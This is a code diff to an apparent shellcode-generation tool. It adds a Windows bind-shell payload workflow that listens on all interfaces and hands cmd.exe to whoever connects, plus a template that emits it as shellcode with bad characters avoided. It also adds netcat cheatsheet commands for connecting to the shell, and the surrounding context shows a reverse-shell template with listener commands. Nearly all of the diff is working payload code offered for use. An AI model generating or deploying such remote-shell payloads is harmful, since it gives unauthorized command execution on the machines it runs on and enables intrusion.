@@ -9,6 +9,8 @@ Reference workflows:
   - run_command: WinExec + ExitProcess with branch on result
   - reverse_shell: WSAStartup, WSASocketA, connect, CreateProcessA
     with typed inputs (lhost, lport), struct init, and error branching
+  - bind_shell: WSAStartup, WSASocketA, bind, listen, accept,
+    CreateProcessA with typed lport, struct init, and error branching
 """
 from __future__ import annotations
 
@@ -348,4 +350,181 @@ class IRReverseShellTemplate(WorkflowTemplate):
         return [
             ("Start netcat listener", f"nc -lnvp {config.lport}"),
             ("Start listener (rlwrap)", f"rlwrap nc -lnvp {config.lport}"),
+        ]
+
+
+# ---------------------------------------------------------------------------
+# Bind shell workflow
+# ---------------------------------------------------------------------------
+
+_INADDR_ANY = 0  # 0.0.0.0
+
+
+def build_bind_shell_workflow(
+    lport: int = 4444,
+    command: str = "cmd.exe",
+) -> Workflow:
+    """Build the bind_shell reference workflow.
+
+    WSAStartup -> WSASocketA -> bind -> listen -> accept ->
+    populate STARTUPINFOA (stdio = accepted socket) -> CreateProcessA ->
+    ExitProcess
+
+    The port is pre-computed to network byte order. The bind address is
+    INADDR_ANY (0.0.0.0) so the shell listens on all interfaces.
+    """
+    port_be = _socket.htons(lport)
+
+    return Workflow(
+        name="ir_bind_shell",
+        blocks=(
+            Block("entry", (
+                DefineConstant("sin_port_be", port_be),
+                DefineConstant("af_inet", 2),
+                DefineConstant("inaddr_any", _INADDR_ANY),
+
+                AllocateStruct("wsadata", "WSADATA"),
+                AllocateStruct("sa", "sockaddr_in"),
+                AllocateStruct("si", "STARTUPINFOA"),
+                AllocateStruct("pi", "PROCESS_INFORMATION"),
+
+                ConstructString("cmd", command),
+
+                CallAPI(
+                    "WSAStartup",
+                    arguments=(Immediate(0x0202), AddressOf("wsadata")),
+                    result="wsa_ret",
+                ),
+                Compare("wsa_ret", SuccessPredicate.ZERO,
+                        true_block="create_socket", false_block="fail"),
+            )),
+
+            Block("create_socket", (
+                CallAPI(
+                    "WSASocketA",
+                    arguments=(
+                        Immediate(2),    # AF_INET
+                        Immediate(1),    # SOCK_STREAM
+                        Immediate(6),    # IPPROTO_TCP
+                        Immediate(0),    # lpProtocolInfo = NULL
+                        Immediate(0),    # g = 0
+                        Immediate(0),    # dwFlags = 0
+                    ),
+                    result="listen_socket",
+                ),
+                Compare("listen_socket", SuccessPredicate.INVALID_HANDLE,
+                        true_block="bind_socket", false_block="fail"),
+            )),
+
+            Block("bind_socket", (
+                ZeroStruct("sa"),
+                WriteStructField("sa", "sin_family", NameRef("af_inet")),
+                WriteStructField("sa", "sin_port", NameRef("sin_port_be")),
+                WriteStructField("sa", "sin_addr", NameRef("inaddr_any")),
+
+                CallAPI(
+                    "bind",
+                    arguments=(
+                        NameRef("listen_socket"),
+                        AddressOf("sa"),
+                        Immediate(0x10),
+                    ),
+                    result="bind_ret",
+                ),
+                Compare("bind_ret", SuccessPredicate.ZERO,
+                        true_block="listen_socket_block", false_block="fail"),
+            )),
+
+            Block("listen_socket_block", (
+                CallAPI(
+                    "listen",
+                    arguments=(
+                        NameRef("listen_socket"),
+                        Immediate(1),   # backlog = 1
+                    ),
+                    result="listen_ret",
+                ),
+                Compare("listen_ret", SuccessPredicate.ZERO,
+                        true_block="accept_conn", false_block="fail"),
+            )),
+
+            Block("accept_conn", (
+                CallAPI(
+                    "accept",
+                    arguments=(
+                        NameRef("listen_socket"),
+                        Immediate(0),   # addr = NULL
+                        Immediate(0),   # addrlen = NULL
+                    ),
+                    result="client_socket",
+                ),
+                Compare("client_socket", SuccessPredicate.INVALID_HANDLE,
+                        true_block="setup_process", false_block="fail"),
+            )),
+
+            Block("setup_process", (
+                ZeroStruct("si"),
+                WriteStructField("si", "cb", Immediate(0x44)),
+                WriteStructField("si", "dwFlags",
+                                 Immediate(_STARTF_USESTDHANDLES)),
+                WriteStructField("si", "hStdInput",
+                                 NameRef("client_socket")),
+                WriteStructField("si", "hStdOutput",
+                                 NameRef("client_socket")),
+                WriteStructField("si", "hStdError",
+                                 NameRef("client_socket")),
+
+                ZeroStruct("pi"),
+
+                CallAPI(
+                    "CreateProcessA",
+                    arguments=(
+                        Immediate(0),       # lpApplicationName = NULL
+                        AddressOf("cmd"),   # lpCommandLine
+                        Immediate(0),       # lpProcessAttributes = NULL
+                        Immediate(0),       # lpThreadAttributes = NULL
+                        Immediate(1),       # bInheritHandles = TRUE
+                        Immediate(0),       # dwCreationFlags = 0
+                        Immediate(0),       # lpEnvironment = NULL
+                        Immediate(0),       # lpCurrentDirectory = NULL
+                        AddressOf("si"),    # lpStartupInfo
+                        AddressOf("pi"),    # lpProcessInformation
+                    ),
+                    result="cpa_ret",
+                ),
+                Compare("cpa_ret", SuccessPredicate.NONZERO,
+                        true_block="success", false_block="fail"),
+            )),
+
+            Block("success", (
+                CallAPI("ExitProcess", arguments=(Immediate(0),)),
+                Terminate(TerminateStyle.HANG),
+            )),
+
+            Block("fail", (
+                CallAPI("ExitProcess", arguments=(Immediate(1),)),
+                Terminate(TerminateStyle.HANG),
+            )),
+        ),
+        entry="entry",
+    )
+
+
+class IRBindShellTemplate(WorkflowTemplate):
+    """IR-backed bind_shell template for CLI integration."""
+
+    def __init__(self) -> None:
+        super().__init__(build_bind_shell_workflow())
+
+    def emit(self, layout: StackLayout, config: TemplateConfig) -> str:
+        workflow = build_bind_shell_workflow(
+            lport=config.lport,
+            command=config.command or "cmd.exe",
+        )
+        return lower_workflow(workflow, layout, config.badchars, config)
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        return [
+            ("Connect to bind shell", f"nc -nv <TARGET_IP> {config.lport}"),
+            ("Connect (rlwrap)", f"rlwrap nc -nv <TARGET_IP> {config.lport}"),
         ]
